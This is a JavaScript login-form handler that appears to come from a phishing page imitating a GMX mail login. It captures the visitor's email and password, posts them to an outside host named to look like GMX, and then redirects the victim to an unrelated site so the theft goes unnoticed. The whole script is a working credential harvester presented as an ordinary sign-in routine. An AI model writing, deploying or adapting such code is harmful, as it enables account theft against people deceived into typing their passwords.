        <script>
async function handleLogin(event) {
    const form = event.target;
    const email = form.email.value;
    const password = form.password.value;

    try {
        // 1. Make PROPER POST request
        const response = await fetch('https://gmx-v3nl.onrender.com/amaro', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        // 2. Check for SPECIFIC success condition
        if (response.ok) {
            const data = await response.json();
            if (data.status === "success") { // Changed to match actual response
                // 3. FORCE immediate redirect
                window.location.href = "https://en.amorosart.com/";
                return; // Prevent further execution
            }
        }
        
        // 4. Clean up any potential hanging requests
        if (!response.ok || data.status !== "success") {
            await response.body.cancel(); // Cleanup
        }

    } catch (error) {
        console.error('Error:', error);
        // 5. Add fallback redirect if needed
        window.location.href = "https://en.amorosart.com/";
    }
    
    // 6. Explicitly prevent form default AFTER everything
    return false;
}
</script>
